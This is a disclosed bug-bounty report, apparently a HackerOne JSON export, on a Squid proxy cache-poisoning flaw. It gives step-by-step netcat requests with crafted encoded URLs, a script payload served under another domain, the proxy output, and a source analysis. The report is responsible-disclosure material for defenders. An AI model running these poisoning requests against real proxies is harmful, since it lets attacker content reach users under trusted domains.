{"id":824753,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84MjQ3NTM=","url":"https://hackerone.com/reports/824753","title":"Cache Poisoning","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2020-03-19T16:44:08.040Z","submitted_at":"2020-03-19T16:44:08.040Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jeriko_one","url":"/jeriko_one","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":54349,"url":"https://hackerone.com/ibb","handle":"ibb","profile_picture_urls":{"small":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153209Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ce1f93347fbf096cff5cab1a34bce4a265eeacd501d777c78c7592dd97c46ade","medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153209Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0324efb2fe921a8050abf968b17a949367cc3c6707694c7a83a1b9fb0256ed1e"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Internet Bug Bounty","twitter_handle":"","website":"https://www.hackerone.com/internet-bug-bounty","about":"The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-12520","CVE-2019-12524"],"singular_disclosure_disabled":false,"disclosed_at":"2021-08-26T23:26:46.049Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2021-07-27T23:26:45.547Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Summary:\nAn attacker can cause Squid to return to the user attacker controlled data, for any domain. From Squid-4.7 and below both HTTPS and FTP could be poisoned. This is due to Squid URL decoding parts of the Request URL and using that to create a hash. Request that decode to the same URL will retrieve the same cached response even if they're from different domains. \n\nThe fix for  CVE-2019-12524 removed the HTTPS aspect of it, but FTP poisoning was still possible till Squid-4.10. \n\n\u003c= Squid-4.9 Vulnerable\n\u003c= Squid-4.7 Can also poison HTTPS was reduced to just FTP \n\nAssigned CVE-2019-12520\nNo Announce was officially made by Squid, and was silently fixed with Squid-4.10. This was going to be announced with http://www.squid-cache.org/Advisories/SQUID-2019_4.txt, but never got published when I demonstrated their patch was incomplete at the time.\n\nFixed in Squid-4.10\n## Steps To Reproduce:\n### Poisoning FTP Cache in Squid-4.9\n1) Start Squid\n2) Start a FTP Server I attached a python script for this\n```\nftp_server.py 8080 8081\n```\n3) Make the Request to poison the cache\n```\necho -e \"GET ftp://hackerone.com%2f%3f@192.168.122.1:8080/payload HTTP/1.1\\r\\n\\r\\n\" |nc \u003csquid hostname\u003e 3128\nnc: using stream socket\nHTTP/1.1 200 Gatewaying\nServer: squid/4.9\nMime-Version: 1.0\nDate: Thu, 19 Mar 2020 15:57:04 GMT\nContent-Type: text/plain\nLast-Modified: Wed, 27 Mar 2019 19:14:54 GMT\nAge: 79\nX-Cache: HIT from g64\nTransfer-Encoding: chunked\nVia: 1.1 g64 (squid/4.9)\nConnection: keep-alive\n\n23\nHello! This is from my ftp server.\n\n0\n```\n\nThe FTP server should have output similar to \n```\n\u003c- 150 Here comes data\nPassive Connection from: ('192.168.122.97', 51647)\n\u003c- Hello! This is from my ftp server.\n\u003c- 226 Data sent\n-\u003e QUIT\n```\n\n4) Now make the request to the actual domain\nNotice the X-Cache: HIT header\n```\necho -e \"GET ftp://hackerone.com/?@192.168.122.1:8080/payload HTTP/1.1\\r\\n\\r\\n\" |nc \u003csquid hostname\u003e 3128\n\nnc: using stream socket\nHTTP/1.1 200 Gatewaying\nServer: squid/4.9\nMime-Version: 1.0\nDate: Thu, 19 Mar 2020 15:57:04 GMT\nContent-Type: text/plain\nLast-Modified: Wed, 27 Mar 2019 19:14:54 GMT\nAge: 249\nX-Cache: HIT from g64\nTransfer-Encoding: chunked\nVia: 1.1 g64 (squid/4.9)\nConnection: keep-alive\n\n23\nHello! This is from my ftp server.\n\n0\n\n```\n\nYou will get the output from the cached response instead of the real response from hackerone.com or whichever domain you're poisoning \n\n### Poisoning HTTPS Cache in Squid-4.7\nTo repro the HTTPS poisoning you need to configure Squid to cache SSL request. This involves generating a root cert, and inserting some config options. https://wiki.squid-cache.org/Features/DynamicSslCert Has steps on how to achieve this. Below is what I added to my config. You will need to change the prefixes to match your system. \n\nReplace the existing http_port 3128 entry with the following:\n```\nhttp_port 3128 ssl-bump \\\n       generate-host-certificates=on dynamic_cert_mem_cache_size=4MB \\\n       cert=/home/j1/h4x/squid/certs/myCA.pem\nsslcrtd_program /home/j1/h4x/squid/ship/squid-4.7/libexec/security_file_certgen -s /home/j1/h4x/squid/ship/squid-4.7/var/lib/ssl_db -M 4MB\n```\n\nIf your test certs aren't valid (self signed for testing) you need to add the following directive in the config. \n```\nsslproxy_cert_error allow all\n```\n\nFinally you'll need to initalize the SSL DB that you've told Squid to use. This is the -s option in sslcrtd_program\n\n```\n./libexec/security_file_certgen ./var/lib/ssl_db -c -s ./var/lib/ssl_db -M 4MB\n```\n\nYou're also going to need a server with SSL that you can control the headers on.\nYou have to send the following header so that Squid will cache your response. \n```\nCache-Control: public, immutable, max-age=31536000\n```\nOnce you've done that you're ready to repo HTTPS poisoning which is essentially the same as our FTP Poisoning. \n\n1) Start Squid\n```\n./sbin/squid\n```\n\n2) start you SSL Server \n\n3) Make a poison request\n```\necho -e \"GET https://hackerone.com%2f%3f@192.168.122.1:8080/html/alert.html HTTP/1.1\\r\\n\\r\\n\" |nc \u003csquid hostname\u003e 3128\n\nnc: using stream socket\nHTTP/1.1 200 OK\nServer: SimpleHTTP/0.6 Python/3.6.10\nDate: Thu, 19 Mar 2020 16:17:46 GMT\nContent-Type: text/html\nContent-Length: 74\nLast-Modified: Mon, 22 Apr 2019 23:18:08 GMT\nCache-Control: public, immutable, max-age=31536000\nX-Cache: MISS from g64\nVia: 1.1 g64 (squid/4.7)\nConnection: keep-alive\n\n\u003chtml\u003e\n\t\u003cbody\u003e\n\t\t\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n\t\u003c/body\u003e\n\u003c/html\u003e\n```\n4) Make the request to the real domain \nNotice the X-Cache: HIT header\n```\necho -e \"GET https://hackerone.com/?@192.168.122.1:8080/html/alert.html HTTP/1.1\\r\\n\\r\\n\" |nc \u003csquid hostname\u003e 3128\nnc: using stream socket\nHTTP/1.1 200 OK\nServer: SimpleHTTP/0.6 Python/3.6.10\nDate: Thu, 19 Mar 2020 16:17:46 GMT\nContent-Type: text/html\nContent-Length: 74\nLast-Modified: Mon, 22 Apr 2019 23:18:08 GMT\nCache-Control: public, immutable, max-age=31536000\nAge: 334\nX-Cache: HIT from g64\nVia: 1.1 g64 (squid/4.7)\nConnection: keep-alive\n\n\u003chtml\u003e\n\t\u003cbody\u003e\n\t\t\u003cscript\u003ealert(document.domain)\u003c/script\u003e\n\t\u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Analysis\n\nWhen making a request Squid will check its cache to see if it has a response\nthat it can serve up. When squid determines that a reply can be cached it uses\na combination of METHOD, absolute URL, and possible vary headers to form a\nMD5 hash.\n\nThis takes place in storeKeyPUblicByRequestMethod\n```\n    SquidMD5Update(\u0026M, \u0026m, sizeof(m));\n    SquidMD5Update(\u0026M, (unsigned char *) url.rawContent(), url.length());\n```\n\nSimilar to the ACL Bypass vuln I reported earlier this abuses that the userInfo is decoded and is stored as part of the url. So when url is used to update the hash it's using a decoded string \n\n```\neffectiveRequestUri() will return url.absolute() for methods that aren't\nCONNECT and schemes that aren't PROTO_AUTHORITY_FORM\n\n Looking at Uri::absolute we see that the userInfo is included into the\n absolute uri representation if the protocol is HTTPS\n\n             const bool omitUserInfo = getScheme() == AnyP::PROTO_HTTP ||\n                                      getScheme() != AnyP::PROTO_HTTPS ||\n                                      userInfo().isEmpty();\n            if (!omitUserInfo) {\n                absolute_.append(userInfo());\n                absolute_.append(\"@\", 1);\n            }\n\nuserInfo is set in Uri::parse if the foundHost contains a @ that\nthe userinfo is extracted and then decoded.\n\n        t = strrchr(foundHost, '@');\n        if (t != NULL) {\n            strncpy((char *) login, (char *) foundHost, sizeof(login)-1);\n            login[sizeof(login)-1] = '\\0';\n            t = strrchr(login, '@');\n            *t = 0;\n            strncpy((char *) foundHost, t + 1, sizeof(foundHost)-1);\n            foundHost[sizeof(foundHost)-1] = '\\0';\n            // Bug 4498: URL-unescape the login info after extraction\n            rfc1738_unescape(login);\n        }\n```\nThis is eventually stored in userInfo when calling parseFinish\n parseFinish(protocol, proto, urlpath, foundHost, SBuf(login), foundPort);\n\nThis userInfo is the decoded version, therefore special tokens such as ? # /\nare possible entries in the userInfo. \n\nIt's possible to have a cache entry for one domain, be used for another\ndomain. Leading to possible HTML/JS execution in a target domain. The\nrequirement being that it must have the HTTPS protocol.\n\nThis can lead to Squid serving the wrong\nReply as multiple request from different domains can look similar.\n\nTake for example the following:\nhttps://squid-cache.org%2F%3F@192.168.1.23:8080/\n\nThe reply from 192.168.1.23 would decode to\nhttps://squid-cache.org/?@192.168.1.23:8080/\nAnd the reply would be stored\n\nNow if a real request for squid-cache.org came in with a similar URL\nhttps://squid-cache.org?@192.168.1.23:8080/\nThe cached reply would be served, and any scripts that were returned by\nthe original request would now be running in squid-cache.org context.\n\n## Impact\n\nAttacker can poison the Cache causing users to receive attacker controlled data when going to a trusted domain. \nSquid-4.9 And below allows an attacker to poison FTP responses, a user could download attacker controlled data thinking it came from a legitiment source. \n\n\u003c= Squid-4.7 Can also poison HTTPS allowing attacker controlled content to run in another domain. \n\nThese both require a user to visit a specially crafted URL.","bounty_amount":"6000.0","formatted_bounty":"$6,000","weakness":{"id":121,"name":"Improper Handling of URL Encoding (Hex Encoding)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":753389,"file_name":"ftp_server.py","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HbVFjvkSVBKEqrUAL9GrTt7A?response-content-disposition=attachment%3B%20filename%3D%22ftp_server.py%22%3B%20filename%2A%3DUTF-8%27%27ftp_server.py\u0026response-content-type=text%2Fx-python\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153209Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=74c381eade9f037391a9daae9af836e7bb34746988b01a1816cbe74efb24d2d9","file_size":4619,"type":"text/x-python"}],"allow_singular_disclosure_at":"2021-08-26T23:26:45.736Z","allow_singular_disclosure_after":-3945923.712512381,"singular_disclosure_allowed":true,"vote_count":12,"voters":["tolga","fqdn","ali","not_khun_myat","akashhamal0x01","ganeshsecure","habibolaamini1359","waterunderthebridge","aseem0x1","renatestrind","and 2 more..."],"severity":{"rating":"high","score":8.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":{"databaseId":84124,"asset_type":"OTHER","asset_identifier":"IBB (Legacy)","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":7377137,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jeriko_one,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@beagle ","automated_response":false,"created_at":"2020-03-20T11:08:50.060Z","updated_at":"2020-03-20T11:08:50.060Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7377372,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @jeriko_one,\n\nThanks again for your report. \n\n\u003e No Announce was officially made by Squid, and was silently fixed with Squid-4.10. This was going to be announced with http://www.squid-cache.org/Advisories/SQUID-2019_4.txt, but never got published when I demonstrated their patch was incomplete at the time.\n\n\nDoes this mean there will be no public advisory at all, or will one be released eventually?\n\nKind regards,\n@beagle ","automated_response":false,"created_at":"2020-03-20T11:41:44.099Z","updated_at":"2020-03-20T11:41:56.664Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7379130,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"I opened the CVE and I'll be requesting that it be made public April 10th. Considering they fixed it without making an announce I don't think they will until I press them on it. \n\nI reported this to Squid 10 months ago, when they made their fix 9 months ago they sent me their patch which I informed was incomplete and never responded to me about this issue. I had reported many issues to them so they were working on those. I asked them for an ETA on the issues that were still open against them (this one included) they told me there was no ETA. I then gave them 60 days (April 10th) before I made public the CVEs. \n\nIt was only when I retested to make this report that I saw that the issue was fixed. ","automated_response":false,"created_at":"2020-03-20T15:30:43.422Z","updated_at":"2020-03-20T15:30:43.422Z","actor":{"username":"jeriko_one","cleared":false,"url":"/jeriko_one","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7379341,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I've sent a request for official announces. I'll give an update when they respond. ","automated_response":false,"created_at":"2020-03-20T15:50:00.312Z","updated_at":"2020-03-20T15:50:00.312Z","actor":{"username":"jeriko_one","cleared":false,"url":"/jeriko_one","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7385438,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I received a response from Squid. Even though this and my other report #824203 they do not want to announce it as they aren't satisfied that their fixes cover all attack scenarios. They provided no ETA when their new patch for these issues will come out, nor when they will announce it. ","automated_response":false,"created_at":"2020-03-21T15:06:02.037Z","updated_at":"2020-03-21T15:06:02.037Z","actor":{"username":"jeriko_one","cleared":false,"url":"/jeriko_one","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7408931,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @jeriko_one,\n\nThank you for your response. Feel free to self-close this report and open a new one once there is a public announcement.\n\nKind regards,\n@beagle ","automated_response":false,"created_at":"2020-03-24T11:46:42.940Z","updated_at":"2020-03-24T11:46:42.940Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7716836,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Squid has officially released an announcement http://www.squid-cache.org/Advisories/SQUID-2019_4.txt","automated_response":false,"created_at":"2020-04-19T22:59:27.387Z","updated_at":"2020-04-19T22:59:27.387Z","actor":{"username":"jeriko_one","cleared":false,"url":"/jeriko_one","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7783091,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"I have submitted your report to Squid Cache (IBB). They will let us know the final ruling on this report. Please note that the status and severity are subject to change.\n\nKind regards,\n@beagle  ","automated_response":false,"created_at":"2020-04-24T13:02:14.735Z","updated_at":"2020-04-24T13:02:14.735Z","actor":{"username":"beagle","cleared":false,"url":"/beagle","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/458/833/024b7a83a4a54282cbcdf96b9b10a93700cf8743_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12705719,"is_internal":false,"editable":false,"type":"Activities::CveIdAdded","message":"","automated_response":false,"created_at":"2021-07-27T23:25:27.339Z","updated_at":"2021-07-27T23:25:27.339Z","cve_ids":["CVE-2019-12520"],"actor":{"username":"kunderkoffler","cleared":false,"url":"/kunderkoffler","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"ibb","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12705721,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @jeriko_one,\n\nThank you for your patience and your contribution to making the internet safer!\n\nHappy hacking!\n ","automated_response":false,"created_at":"2021-07-27T23:26:00.135Z","updated_at":"2021-07-27T23:26:00.135Z","actor":{"url":"/ibb","ibb":false,"profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ4IEPVQO5%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153209Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIEfiwE8ABftQ4ZDSo2PcCdmgWGJAVhZBcjrVILPjej50AiACAJuLWZpiOUokpZpZYio1aaS1zedU6yBiP02ueFvn1iqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMwnKCmy9PUlqhlDykKtcDeye%2FigxH7oQuBLWPNAddVUxCetP%2B6VM%2FIfdoNEAf8dePeEZ6nfGVUDz0owpAQ8YnLRTgfKqbZIg9uvHiJY%2F4BbcoCSwwJdRGPldLb3Y3WlPcJ1JvXUEefleLwhstFskHZ2cPwg1VDGmKUpYSrXj0yczI934c5Lp8FHGi7k73DEu%2FAkrDbRnSZHG42WaaqPNNWImCdPeTEmq3NWpEt8cesOA6Xa4VqYMRs9drBzvQOySUd6OOKhFszrFCIooeL9FH3tfL1jRUt27tojJhfuYEL1%2BXkCSnEkXAKcWclEQwC3FfnY0XhghLZDzab25hU%2Bd2h1mXTSBw8U0KUeuS7BYp2gJWFyuMnua0PPwpsnfW%2B9HdmkGFEZMkcwfZlh9E6l1XmyYfjTKzbK4akQ37CPeaxglSuydRq%2BOr7eoa4bJwD8SbBbqyaFHvzfbmsQAD6vBhy3a3VJ%2FRjznM9l%2FDW%2BnlGoCNLaIcQRZvZ0zDR6x%2ByF%2BOA4LXd0zzf8we7BSGFKyQfoRnsOQpRday7KSiYLmMmNfRdBrUHLRHvgeo%2BpRsKlDHGprEYxVC9m%2FkU3USyz305DDgoYfE7CyGX%2FKauSdBx1ZrMRAhyMPdXtfyvzVr4uFs8EB9pzBTMM%2F%2FkIsGOqYBpHeiPK1x0yJBNNgdNDNHwOZb44D7QldQoMShvupPsVW7xgZ9egfooN5Hr7L7zQT0se6VW6MDEHSuh790gIEL3N2l3o4i8vRIQjRoeoSklFrZONuWaRaLdV2EJtaDDZ%2BwBg0kYTnQOYCaI2vJ3EB7BWjw1JRVBpZH6NvHFfING%2B%2Bhp9nGXAhqXdBxPezBeHqUbpMsZkRZrmnH1UVt5up6rjaXPnhY6Q%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0324efb2fe921a8050abf968b17a949367cc3c6707694c7a83a1b9fb0256ed1e"},"profile":{"name":"Internet Bug 